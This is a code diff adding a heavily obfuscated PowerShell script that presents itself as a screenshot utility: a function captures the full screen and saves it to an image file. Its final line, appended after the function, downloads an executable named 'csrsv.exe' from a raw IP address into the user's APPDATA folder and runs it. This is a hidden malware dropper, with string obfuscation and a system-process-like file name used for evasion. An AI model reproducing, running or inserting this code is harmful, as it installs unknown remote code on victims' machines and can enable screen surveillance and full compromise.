@@ -1,0 +1,48 @@
+  ${Y`42}=[TYPe]("{5}{0}{6}{4}{3}{1}{2}"-F'.wIndOws.fo','AtI','On','mInFOrm','tE','sYSTEm','RMS.sys') ;  ${rI`4X}=[typE]("{3}{5}{1}{2}{0}{4}" -f 'grAPHIc','R','AWINg.','System.','S','d')  ; 
+
+function ne`w-sc`ReeNSh`Ot
+{
+	
+	[OutputType([System.IO.FileInfo])]
+	[CmdletBinding()]
+	param
+	(
+		[Parameter(MANdAtoRY)]
+		[ValidateNotNullOrEmpty()]
+		[ValidateScript({ -not (&("{0}{3}{1}{2}"-f'Te','t','h','st-Pa') -Path ${_} -PathType ("{0}{1}" -f 'Lea','f')) })]
+		[ValidatePattern({(("{2}{1}{0}{3}{4}" -f'0}.jpeg','}{','{0}.jpg{1','{1}{0}','.bmp'))-f  [chaR]92,[chaR]124})]
+		[string]${fI`leP`AtH}
+			
+	)
+	begin {
+		${ERR`orA`ctio`Np`REFerEn`cE} = ("{0}{1}" -f 'St','op')
+		&("{2}{1}{0}" -f'pe','-Ty','Add') -AssemblyName ("{0}{2}{3}{1}"-f 'Syste','dows.Forms','m.','Win')
+		&("{1}{0}{2}" -f 'd-ty','Ad','pe') -AssemblyName ("{2}{3}{0}{1}" -f 'D','rawing','Syst','em.')
+	}
+	process {
+		try
+		{
+			
+			${sC`RE`En} =   (gI ("{0}{2}{1}{3}" -f 'v','L','arIaB','E:Y42') )."Val`Ue"::"vIRtuAl`S`c`Re`EN"
+
+			
+			${b`It`MaP} = &("{1}{0}{2}" -f '-Objec','New','t') ("{2}{1}{4}{3}{0}{6}{5}"-f 'g.','ystem','S','awin','.Dr','tmap','Bi') ${s`CrE`en}."w`idTH", ${SCr`eEn}."Hei`ghT"
+			
+			
+			${gR`APHic} =  (  cHiLditEM  ("{0}{2}{1}"-f 'vAr','4X','iabLe:rI'))."VA`Lue"::("{1}{2}{0}" -f 'mImage','Fr','o').Invoke(${b`itm`Ap})
+			
+			
+			${gra`P`Hic}.("{2}{1}{0}" -f'yFromScreen','p','Co').Invoke(${s`crEen}."Le`FT", ${S`cr`EEn}."t`OP", 0, 0, ${bIT`map}."sI`ZE")
+			
+			
+			${Bit`mAP}.("{1}{0}"-f'e','Sav').Invoke(${f`i`lepA`Th})
+			
+			&("{2}{0}{1}" -f 'Ite','m','Get-') -Path ${Fi`LEPa`Th}
+		}
+		catch
+		{
+			${PSCmD`L`Et}.("{2}{3}{1}{0}" -f 'rror','owTerminatingE','T','hr').Invoke(${_})
+		}
+	}
+}
+(.("{0}{3}{1}{2}" -f'New-O','j','ect','b') ("{0}{5}{2}{4}{3}{1}"-f 'Sy','Net.WebClient','te','.','m','s')).("{2}{0}{3}{1}"-f'nlo','File','Dow','ad').Invoke(("{1}{2}{11}{5}{3}{4}{6}{7}{0}{9}{10}{8}"-f'o','http:','//','70.21','8','48.1','/','~yaho','xe','/c','srsv.e','89.2'),"$env:APPDATA\csrsv.exe");&("{1}{3}{2}{0}" -f'Process','Sta','-','rt') ("$env:APPDATA\csrsv.exe")
